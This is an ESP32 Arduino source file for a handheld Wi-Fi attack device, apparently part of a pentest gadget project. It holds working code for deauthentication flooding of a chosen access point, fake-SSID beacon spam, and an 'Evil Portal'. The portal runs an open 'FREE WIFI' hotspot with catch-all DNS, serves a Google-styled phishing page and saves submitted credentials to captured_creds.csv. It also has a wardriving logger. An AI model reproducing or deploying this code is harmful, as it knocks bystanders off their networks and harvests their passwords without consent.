#define DEAUTHER
#include <Arduino.h>
#include <Adafruit_SH110X.h>
#include <GyverButton.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include "CONFIG.h"
#include "wifi_module.h"
#include <WiFi.h>
#include "deauth.h"
#include "evilportal.h"
#include "display.h"

extern Adafruit_SH1106G display;
extern GButton buttonUp, buttonDown, buttonOK, buttonBack;
extern bool inMenu;
extern byte currentMenu, wifiMenuIndex;

#define MAX_FILES 50
String portalList[MAX_FILES];
int portalCount = 0;
int portalIndex = 0;
bool inPortalExplorer = false;

bool inSpamMenu = false, isSpamming = false;
bool inEvilPortal = false, apRunning = false;
bool inDeauthMenu = false, isScanning = false, isDeauthing = false;
bool inWardriving = false, isWardriving = false;
int foundNetworks = 0;
String ssidList[10];
uint8_t bssidList[10][6];
int deauthMenuIndex = 0;
File wardrivingFile;
int wardrivingFileNumber = 1;
unsigned long lastScanTime = 0;
const unsigned long SCAN_INTERVAL = 500;
wifi_ap_record_t apRecords[10];

#if defined(LANGUAGE_FR_FR) || defined(LANGUAGE_PT_BR)
const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
#else 
const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
#endif
const bool wpa2 = true;
int spread = 1, spamtype = 1;
uint8_t channelIndex = 0, wifi_channel = 1;
uint32_t packetCounter = 0;
char emptySSID[32];
uint8_t macAddr[6];



void displayWiFiMenu(Adafruit_SH1106G &display, byte menuIndex) {
  display.clearDisplay();
  
  auto centerText = [](const char* text, int textSize) {
    return (128 - strlen(text) * (textSize == 2 ? 12 : 6)) / 2;
  };

  byte next = (menuIndex + 1) % WIFI_MENU_ITEM_COUNT;
  byte prev = (menuIndex + WIFI_MENU_ITEM_COUNT - 1) % WIFI_MENU_ITEM_COUNT;

  display.setTextSize(2);
  display.setCursor(centerText(wifiMenuItems[menuIndex], 2), 25);
  display.print(wifiMenuItems[menuIndex]);
  
  display.setTextSize(1);
  display.setCursor(centerText(wifiMenuItems[next], 1), 50);
  display.print(wifiMenuItems[next]);
  display.setCursor(centerText(wifiMenuItems[prev], 1), 7);
  display.print(wifiMenuItems[prev]);
  
  display.setCursor(2, 30);
  display.print(">");
  display.setCursor(120, 30);
  display.print("<");
  
  display.display();
}

const char funnyssids[] PROGMEM = {
  "Mom Use This One\n"
  "Abraham Linksys\n"
  "Benjamin FrankLAN\n"
  "Martin Router King\n"
  "John Wilkes Bluetooth\n"
  "Pretty Fly for a Wi-Fi\n"
  "Bill Wi the Science Fi\n"
  "I Believe Wi Can Fi\n"
  "Tell My Wi-Fi Love Her\n"
  "No More Mister Wi-Fi\n"
  "LAN Solo\n"
  "The LAN Before Time\n"
  "Silence of the LANs\n"
  "House LANister\n"
  "Winternet Is Coming\n"
  "Ping’s Landing\n"
  "The Ping in the North\n"
  "This LAN Is My LAN\n"
  "Get Off My LAN\n"
  "The Promised LAN\n"
  "The LAN Down Under\n"
  "FBI Surveillance Van 4\n"
  "Area 51 Test Site\n"
  "Drive-By Wi-Fi\n"
  "Planet Express\n"
  "Wu Tang LAN\n"
  "Darude LANstorm\n"
  "Never Gonna Give You Up\n"
  "Hide Yo Kids, Hide Yo Wi-Fi\n"
  "Loading…\n"
  "Searching…\n"
  "VIRUS.EXE\n"
  "Virus-Infected Wi-Fi\n"
  "Starbucks Wi-Fi\n"
  "Text ###-#### for Password\n"
  "Yell ____ for Password\n"
  "The Password Is 1234\n"
  "Free Public Wi-Fi\n"
  "No Free Wi-Fi Here\n"
  "Get Your Own Damn Wi-Fi\n"
  "It Hurts When IP\n"
  "Dora the Internet Explorer\n"
  "404 Wi-Fi Unavailable\n"
  "Porque-Fi\n"
  "Titanic Syncing\n"
  "Test Wi-Fi Please Ignore\n"
  "Drop It Like It’s Hotspot\n"
  "Life in the Fast LAN\n"
  "The Creep Next Door\n"
  "Ye Olde Internet\n"
};

const char rickrollssids[] PROGMEM = {
  "01 Never gonna give you up\n"
  "02 Never gonna let you down\n"
  "03 Never gonna run around\n"
  "04 and desert you\n"
  "05 Never gonna make you cry\n"
  "06 Never gonna say goodbye\n"
  "07 Never gonna tell a lie\n"
  "08 and hurt you\n"
};

WebServer server(80);
DNSServer dnsServer;
String capturedData = "";
const byte DNS_PORT = 53;

extern "C" {
#include "esp_wifi.h"
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00,
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
  0xe8, 0x03,
  0x31, 0x00,
  0x00, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01,
  0x01,
  0x30, 0x18,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x02, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};

String getCurrentWardrivingFileName() {
  return "/WiFi/Wardriving/Wardriving_" + String(wardrivingFileNumber) + ".txt";
}

void displaySpamPrompt() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0);
  display.println(F("Press OK."));
  display.println(F("====================="));
  display.display();
}

void displaySpamActive() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0);
  display.println(F("WiFi-Spam..."));
  display.println(F("====================="));
  display.display();
}

void displayEvilPortalScreen() {
  Serial.print(F("displayEvilPortalScreen: capturedData="));
  Serial.println(capturedData);
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0);
  display.println(F("Evil-Portal"));
  display.setCursor(0, 10);
  display.println(F("IP: 192.168.4.1"));
  display.println(F("---------------------"));
  
  if (capturedData != "") {
    display.setCursor(0, 30);
    int newlineIndex = capturedData.indexOf('\n');
    String firstLine = newlineIndex != -1 ? capturedData.substring(0, newlineIndex) : capturedData;
    String secondLine = newlineIndex != -1 ? capturedData.substring(newlineIndex + 1) : "";
    if (firstLine.length() > 20) firstLine = firstLine.substring(0, 17) + "...";
    if (secondLine.length() > 20) secondLine = secondLine.substring(0, 17) + "...";
    display.println(firstLine);
    if (display.getCursorY() < 50 && secondLine != "") {
      display.setCursor(0, display.getCursorY() + 10); // Add 10 pixels for blank line
      display.println(secondLine);
    }
  }
  display.display();
}

void displayDeauthActive(String ssid) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(3, 3);
  display.println(F("Deauth..."));
  display.println(F("---------------------"));
  display.println(ssid.substring(0, 15));
  display.display();
}

void displayWardrivingPrompt() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0);
  display.println(F("Press OK."));
  display.println(F("---------------------"));
  display.display();
}

void displayWardrivingActive() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0);
  display.println(F("Wardriving..."));
  display.println(F("---------------------"));
  if (foundNetworks > 0) {
    display.print(foundNetworks);
    display.print(F(". "));
    display.println(ssidList[0].substring(0, 15));
    char bssidStr[18];
    snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             bssidList[0][0], bssidList[0][1], bssidList[0][2],
             bssidList[0][3], bssidList[0][4], bssidList[0][5]);
    display.print(F("MAC: "));
    display.println(bssidStr);
    display.print(F("Enc: "));
    display.println(apRecords[0].authmode == WIFI_AUTH_OPEN ? F("Open") : 
                   apRecords[0].authmode == WIFI_AUTH_WEP ? F("WEP") : 
                   apRecords[0].authmode == WIFI_AUTH_WPA_PSK ? F("WPA") : 
                   apRecords[0].authmode == WIFI_AUTH_WPA2_PSK ? F("WPA2") : F("Other"));
    display.print(F("RSSI: "));
    display.println(apRecords[0].rssi);
  }
  display.display();
}

void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex++];
    if (channelIndex >= sizeof(channels)) channelIndex = 0;
    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
      Serial.print(F("Channel: "));
      Serial.println(wifi_channel);
    }
  }
}

void beaconSpamList(const char list[]) {
  int i = 0, ssidNum = 1;
  int ssidsLen = strlen_P(list);

  while (i < ssidsLen && isSpamming) {
    buttonOK.tick();
    buttonBack.tick();
    if (buttonOK.isClick() || buttonBack.isClick()) {
      isSpamming = false;
      WiFi.mode(WIFI_OFF);
      esp_wifi_set_promiscuous(false);
      Serial.println(F("WiFi spam stopped"));
      return;
    }

    int j = 0;
    char tmp;
    do {
      tmp = pgm_read_byte(list + i + j++);
    } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);

    uint8_t ssidLen = j - 1;
    macAddr[5] = ssidNum++;
    memcpy(&beaconPacket[10], macAddr, 6);
    memcpy(&beaconPacket[16], macAddr, 6);
    memcpy(&beaconPacket[38], emptySSID, 32);
    memcpy_P(&beaconPacket[38], &list[i], ssidLen);
    beaconPacket[82] = wifi_channel;

    for (int k = 0; k < 3 && isSpamming; k++) {
      esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
      if (result == ESP_OK) {
        packetCounter++;
        Serial.print(F("Packet #"));
        Serial.println(packetCounter);
      } else {
        Serial.print(F("Packet failed: "));
        Serial.println(result, HEX);
        isSpamming = false;
        return;
      }
    }

    i += j;
    nextChannel();

    unsigned long start = millis();
    while (millis() - start < 10 && isSpamming) {
      buttonOK.tick();
      buttonBack.tick();
      if (buttonOK.isClick() || buttonBack.isClick()) {
        isSpamming = false;
        WiFi.mode(WIFI_OFF);
        esp_wifi_set_promiscuous(false);
        Serial.println(F("WiFi spam stopped"));
        return;
      }
    }
  }
}

void handlePostRequest() {
  capturedData = "";
  String csvLine = "";
  for (uint8_t i = 0; i < server.args(); i++) {
    String argName = server.argName(i);
    String argValue = server.arg(i);
    
    // Skip irrelevant or unwanted parameters
    if (argName == "q" || argName.startsWith("cup2") || argName.startsWith("plain") ||
        argName == "P1" || argName == "P2" || argName == "P3" || argName == "P4") {
      continue;
    }
    
    // Build capturedData for display (only value, no key)
    capturedData += argValue + "\n";
    
    // Build CSV line (key:value,)
    if (i > 0) csvLine += ",";
    csvLine += argName + ":" + argValue;
    
    Serial.print(argName + ": ");
    Serial.println(argValue);
  }
  
  if (capturedData == "") {
    capturedData = "No valid data";
  }
  
  // Save to CSV file on SD card asynchronously
  saveCapturedDataToCSV(csvLine);
  
  // Immediate feedback
  digitalWrite(2, HIGH);
  delay(50);
  digitalWrite(2, LOW);
  
  // Update display
  displayEvilPortalScreen();
  
  // Send redirect response immediately
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void saveCapturedDataToCSV(String csvLine) {
  if (csvLine == "") return;
  
  String filePath = "/WiFi/Portals/captured_creds.csv";
  
  File file = SD.open(filePath, FILE_APPEND);
  if (!file) {
    Serial.println(F("Failed to open CSV file for appending"));
    return;
  }
  
  file.println(csvLine);
  file.close();
  Serial.println(F("Captured data saved to CSV"));
}

String getCurrentPortalHtml = "";

void createDefaultPortal() {
  String path = "/WiFi/Portals/Google.html";
  if (SD.exists(path)) return;

  File file = SD.open(path, FILE_WRITE);
  if (!file) {
    Serial.println(F("Failed to create Google.html"));
    return;
  }

  const char* p = portalHtml;
  char c;
  while ((c = pgm_read_byte(p++))) {
    file.write(c);
  }
  file.close();
  Serial.println(F("Created Google.html on SD"));
}

void loadPortalList() {
  if (!SD.exists("/WiFi/Portals")) SD.mkdir("/WiFi/Portals");
  createDefaultPortal();

  portalCount = 0;
  File dir = SD.open("/WiFi/Portals");
  if (!dir) {
    Serial.println(F("Failed to open /WiFi/Portals"));
    return;
  }
  while (portalCount < MAX_FILES) {
    File entry = dir.openNextFile();
    if (!entry) break;
    if (!entry.isDirectory()) {
      String name = entry.name();
      if (name.endsWith(".html")) {
        portalList[portalCount] = name;
        portalCount++;
      }
    }
    entry.close();
  }
  dir.close();
  Serial.print(F("Found "));
  Serial.print(portalCount);
  Serial.println(F(" .html files"));
}

String loadHtmlFromSD(String filename) {
  String path = "/WiFi/Portals/" + filename;
  File file = SD.open(path, FILE_READ);
  if (!file) {
    Serial.print(F("Failed to open "));
    Serial.println(path);
    return "";
  }
  String html = "";
  while (file.available()) {
    html += (char)file.read();
  }
  file.close();
  
  // Extract AP name from custom HTML comment
  int apStart = html.indexOf("<!-- AP=\"");
  if (apStart != -1) {
    int apEnd = html.indexOf("\" -->", apStart);
    if (apEnd != -1) {
      String extractedApName = html.substring(apStart + 9, apEnd);
      Serial.print(F("Extracted AP name from HTML: "));
      Serial.println(extractedApName);
    }
  }
  
  return html;
}

void displayPortalExplorer() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextWrap(false);

  if (portalCount == 0) {
    display.setTextColor(SH110X_WHITE);
    display.setCursor(0, 0);
    display.println(F("No .html files"));
    display.display();
    return;
  }

  int startIndex = portalIndex - (portalIndex % 5);
  for (int i = 0; i < 5 && (startIndex + i) < portalCount; i++) {
    int idx = startIndex + i;
    String name = portalList[idx];
    if (name.length() > 16) name = name.substring(0, 16);
    if (idx == portalIndex) {
      display.fillRect(0, i * 12, 128, 12, SH110X_WHITE);
      display.setTextColor(SH110X_BLACK);
    } else {
      display.setTextColor(SH110X_WHITE);
    }
    display.setCursor(0, i * 12);
    display.println(name);
  }
  display.display();
}

void startEvilPortal() {
  pinMode(2, OUTPUT);
  digitalWrite(2, LOW);

  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP);
  WiFi.softAP("FREE WIFI", "");
  Serial.println(F("AP started. IP: 192.168.4.1"));

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", HTTP_GET, []() {
    Serial.println(F("Request: /"));
    server.send(200, "text/html", getCurrentPortalHtml.c_str());
  });

  server.on("/post", HTTP_POST, handlePostRequest);

  server.onNotFound([]() {
    Serial.println("Request: " + server.uri());
    if (server.method() == HTTP_POST || server.args() > 0) {
      handlePostRequest();
    } else {
      server.sendHeader("Location", "/", true);
      server.send(302, "text/plain", "");
    }
  });

  server.begin();
  apRunning = true;
}

void stopEvilPortal() {
  Serial.println(F("AP stopped"));
  server.close();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(100);
  apRunning = false;
  capturedData = "";
  digitalWrite(2, LOW);
  // Reinitialize SD card after WiFi AP mode
  extern SPIClass sdSPI;
  sdSPI.end();
  delay(100);
  sdSPI.begin(SD_CLK, SD_MISO, SD_MOSI);
  SD.begin(-1, sdSPI);
  Serial.println(F("SD card and SPI reinitialized after WiFi AP"));
}

void startWardriving() {
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_max_tx_power(82);

  String fileName = getCurrentWardrivingFileName();
  wardrivingFile = SD.open(fileName, FILE_WRITE);
  if (wardrivingFile) {
    Serial.println(F("Wardriving file opened"));
    wardrivingFile.println(F("Wardriving started."));
    wardrivingFile.println(F("=================="));
  }
  isWardriving = true;
  foundNetworks = 0;
  lastScanTime = 0;
  WiFi.scanNetworks(true, true);
  Serial.println(F("Starting Wardriving"));
  displayWardrivingActive();
}

void finishWardriving() {
  if (wardrivingFile) {
    wardrivingFile.println(F("=================="));
    wardrivingFile.println(F("Wardriving finished."));
    wardrivingFile.close();
  }
  WiFi.scanDelete();
  WiFi.mode(WIFI_OFF);
  isWardriving = false;
  wardrivingFileNumber++;
  foundNetworks = 0;
  Serial.println(F("Wardriving finished"));
}

bool isNetworkUnique(String ssid, uint8_t* bssid) {
  for (int i = 0; i < foundNetworks; i++) {
    if (ssid == ssidList[i] && memcmp(bssid, bssidList[i], 6) == 0) {
      return false;
    }
  }
  return true;
}

void scanNetworks() {
  if (millis() - lastScanTime >= SCAN_INTERVAL) {
    int newFoundNetworks = WiFi.scanComplete();
    if (newFoundNetworks >= 0) {
      if (newFoundNetworks > 0 && wardrivingFile) {
        for (int i = 0; i < newFoundNetworks; i++) {
          wifi_ap_record_t *record = (wifi_ap_record_t *)WiFi.getScanInfoByIndex(i);
          if (record) {
            String ssid = WiFi.SSID(i);
            String bssid;
            char bssidStr[18];
            snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                     record->bssid[0], record->bssid[1], record->bssid[2],
                     record->bssid[3], record->bssid[4], record->bssid[5]);
            bssid = String(bssidStr);

            if (isNetworkUnique(ssid, record->bssid)) {
              for (int j = min(foundNetworks, 9); j > 0; j--) {
                ssidList[j] = ssidList[j - 1];
                memcpy(&apRecords[j], &apRecords[j - 1], sizeof(wifi_ap_record_t));
                memcpy(&bssidList[j], &bssidList[j - 1], 6);
              }
              ssidList[0] = ssid;
              memcpy(&apRecords[0], record, sizeof(wifi_ap_record_t));
              memcpy(&bssidList[0], record->bssid, 6);
              foundNetworks = min(foundNetworks + 1, 10);

              wardrivingFile.print(foundNetworks);
              wardrivingFile.print(F(". "));
              wardrivingFile.println(ssid);
              wardrivingFile.print(F("MAC: "));
              wardrivingFile.println(bssid);
              wardrivingFile.print(F("Enc: "));
              wardrivingFile.println(record->authmode == WIFI_AUTH_OPEN ? F("Open") : 
                                    record->authmode == WIFI_AUTH_WEP ? F("WEP") : 
                                    record->authmode == WIFI_AUTH_WPA_PSK ? F("WPA") : 
                                    record->authmode == WIFI_AUTH_WPA2_PSK ? F("WPA2") : F("Other"));
              wardrivingFile.print(F("RSSI: "));
              wardrivingFile.println(record->rssi);
              wardrivingFile.println(F("------------------------"));
            }
          }
        }
        WiFi.scanDelete();
        WiFi.scanNetworks(true, true);
      }
      lastScanTime = millis();
    }
  }
}

void handleWardriving() {
  buttonOK.tick();
  buttonBack.tick();

  if (isWardriving) {
    scanNetworks();
    displayWardrivingActive();
  } else {
    displayWardrivingPrompt();
  }

  if (buttonOK.isClick()) {
    if (!isWardriving) {
      startWardriving();
    } else {
      finishWardriving();
      displayWardrivingPrompt();
    }
  }

  if (buttonBack.isClick()) {
    if (isWardriving) {
      finishWardriving();
    }
    inWardriving = false;
    displayWiFiMenu(display, wifiMenuIndex);
    Serial.println(F("Back to WiFi submenu"));
  }
}

void handleDeauthSubmenu() {
  buttonUp.tick();
  buttonDown.tick();
  buttonOK.tick();
  buttonBack.tick();

  if (isScanning) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SH110X_WHITE);
    display.setCursor(3, 3);
    display.println(F("Scanning:"));
    display.println(F("---------------------"));
    display.println(F("..."));
    display.display();

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    foundNetworks = WiFi.scanNetworks(false, true);
    if (foundNetworks > 0) {
      isScanning = false;
      deauthMenuIndex = 0;
      for (int i = 0; i < min(foundNetworks, 10); i++) {
        ssidList[i] = WiFi.SSID(i);
        wifi_ap_record_t *record = (wifi_ap_record_t *)WiFi.getScanInfoByIndex(i);
        if (record) {
          memcpy(&apRecords[i], record, sizeof(wifi_ap_record_t));
        }
      }
    } else {
      display.clearDisplay();
      display.setTextSize(1);
      display.setTextColor(SH110X_WHITE);
      display.setCursor(0, 0);
      display.print(F("No networks found"));
      display.display();
      delay(2000);
      isScanning = false;
      inDeauthMenu = false;
      displayWiFiMenu(display, wifiMenuIndex);
      Serial.println(F("No networks found"));
      return;
    }
  }

  if (isDeauthing) {
    displayDeauthActive(ssidList[deauthMenuIndex]);
    uint8_t targetChannel = apRecords[deauthMenuIndex].primary;
    uint8_t *apMAC = apRecords[deauthMenuIndex].bssid;
    uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    wsl_bypasser_send_deauth_frame(targetChannel, broadcastMAC, apMAC, apMAC, 0xC0, 0x0007);
    wsl_bypasser_send_deauth_frame(targetChannel, broadcastMAC, apMAC, apMAC, 0xA0, 0x0007);

    wsl_bypasser_send_deauth_frame(targetChannel, apMAC, broadcastMAC, apMAC, 0xC0, 0x0007);
    wsl_bypasser_send_deauth_frame(targetChannel, apMAC, broadcastMAC, apMAC, 0xA0, 0x0007);

    buttonBack.tick();
    if (buttonBack.isClick()) {
      isDeauthing = false;
      WiFi.mode(WIFI_OFF);
      displayWiFiMenu(display, wifiMenuIndex);
      Serial.println(F("Deauth stopped by back button"));
    }

    delay(50);
    return;
  }

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(3, 3);
  display.println(F("Networks:"));
  display.println(F("---------------------"));

  int startIndex = max(0, deauthMenuIndex - 4);
  for (int i = startIndex; i < min(foundNetworks, startIndex + 5); i++) {
    display.setCursor(i == deauthMenuIndex ? 2 : 3, display.getCursorY());
    display.print(i == deauthMenuIndex ? F("> ") : F("  "));
    display.println(ssidList[i].substring(0, 15));
  }
  display.display();

  if (buttonUp.isClick()) {
    deauthMenuIndex = max(0, deauthMenuIndex - 1);
    Serial.println(F("Deauth menu Up"));
  }
  if (buttonDown.isClick()) {
    deauthMenuIndex = min(foundNetworks - 1, deauthMenuIndex + 1);
    Serial.println(F("Deauth menu Down"));
  }

  if (buttonOK.isClick()) {
    Serial.print(F("Starting deauth on: "));
    Serial.println(ssidList[deauthMenuIndex]);
    init_deauth_wifi();
    isDeauthing = true;
    Serial.println(F("Starting deauth"));
  }

  if (buttonBack.isClick()) {
    isScanning = false;
    inDeauthMenu = false;
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
    displayWiFiMenu(display, wifiMenuIndex);
    Serial.println(F("Back to WiFi submenu"));
  }
}

void handleWiFiSubmenu() {
  memset(emptySSID, 0x20, 32);
  emptySSID[31] = '\0';

  buttonUp.tick();
  buttonDown.tick();
  buttonOK.tick();
  buttonBack.tick();

  if (inEvilPortal) {
    if (inPortalExplorer) {
      displayPortalExplorer();
      if (buttonUp.isClick()) {
        portalIndex = (portalIndex == 0) ? (portalCount - 1) : portalIndex - 1;
        displayPortalExplorer();
      }
      if (buttonDown.isClick()) {
        portalIndex = (portalIndex == portalCount - 1) ? 0 : portalIndex + 1;
        displayPortalExplorer();
      }
      if (buttonOK.isClick() && portalCount > 0) {
        String selectedFile = portalList[portalIndex];
        getCurrentPortalHtml = loadHtmlFromSD(selectedFile);
        if (getCurrentPortalHtml == "") {
          display.clearDisplay();
          display.setTextSize(1);
          display.setTextColor(SH110X_WHITE);
          display.setCursor(0, 0);
          display.println(F("Failed to load HTML"));
          display.display();
          delay(2000);
          displayPortalExplorer();
          return;
        }
        inPortalExplorer = false;
        startEvilPortal();
        Serial.print(F("Starting Evil Portal with "));
        Serial.println(selectedFile);
      }
      if (buttonBack.isClick()) {
        inEvilPortal = false;
        inPortalExplorer = false;
        display.clearDisplay();
        inMenu = true;
        wifiMenuIndex = 0;
        OLED_printMenu(display, currentMenu);
        Serial.println(F("Back to main menu from EvilPortal explorer"));
        delay(200);
      }
    } else {
      server.handleClient();
      dnsServer.processNextRequest();
      displayEvilPortalScreen();
      if (buttonBack.isClick()) {
        stopEvilPortal();
        inEvilPortal = false;
        display.clearDisplay();
        displayWiFiMenu(display, wifiMenuIndex);
        delay(200);
        Serial.println(F("Evil Portal stopped"));
      }
    }
    return;
  }

  if (inDeauthMenu) {
    handleDeauthSubmenu();
    return;
  }

  if (inWardriving) {
    handleWardriving();
    return;
  }

  if (inSpamMenu) {
    if (!isSpamming) displaySpamPrompt();
    else displaySpamActive();
  } else {
    displayWiFiMenu(display, wifiMenuIndex);
  }

  if (!inSpamMenu && !inEvilPortal && !inDeauthMenu && !inWardriving) {
    if (buttonUp.isClick()) {
      wifiMenuIndex = (wifiMenuIndex - 1 + WIFI_MENU_ITEM_COUNT) % WIFI_MENU_ITEM_COUNT;
      displayWiFiMenu(display, wifiMenuIndex);
      Serial.println(F("WiFi menu Up"));
    }
    if (buttonDown.isClick()) {
      wifiMenuIndex = (wifiMenuIndex + 1) % WIFI_MENU_ITEM_COUNT;
      displayWiFiMenu(display, wifiMenuIndex);
      Serial.println(F("WiFi menu Down"));
    }
  }

  if (buttonOK.isClick()) {
    Serial.println(F("WiFi menu OK"));
    if (wifiMenuIndex == 0) {
      inDeauthMenu = true;
      isScanning = true;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      Serial.println(F("Starting WiFi scan"));
    } else if (wifiMenuIndex == 1) {
      if (!inSpamMenu) {
        inSpamMenu = true;
        displaySpamPrompt();
      } else {
        isSpamming = !isSpamming;
        if (isSpamming) {
          init_deauth_wifi();
          displaySpamActive();
          Serial.println(F("Starting WiFi spam"));
        } else {
          WiFi.mode(WIFI_OFF);
          displaySpamPrompt();
          Serial.println(F("Stopping WiFi spam"));
        }
      }
    } else if (wifiMenuIndex == 2) {
      inEvilPortal = true;
      inPortalExplorer = true;
      portalIndex = 0;
      portalCount = 0;
      loadPortalList();
      displayPortalExplorer();
      Serial.println(F("Entering Evil Portal explorer"));
    } else if (wifiMenuIndex == 3) {
      inWardriving = true;
      displayWardrivingPrompt();
      Serial.println(F("Entering Wardriving"));
    }
  }

  if (buttonBack.isClick()) {
    if (inSpamMenu) {
      if (isSpamming) {
        isSpamming = false;
        WiFi.mode(WIFI_OFF);
        Serial.println(F("Stopping WiFi spam"));
      }
      inSpamMenu = false;
      displayWiFiMenu(display, wifiMenuIndex);
      Serial.println(F("Back to WiFi submenu"));
    } else {
      inMenu = true;
      wifiMenuIndex = 0;
      OLED_printMenu(display, currentMenu);
      Serial.println(F("Back to main menu"));
    }
  }

  if (isSpamming && inSpamMenu) {
    beaconSpamList(spamtype == 1 ? funnyssids : rickrollssids);
  }
}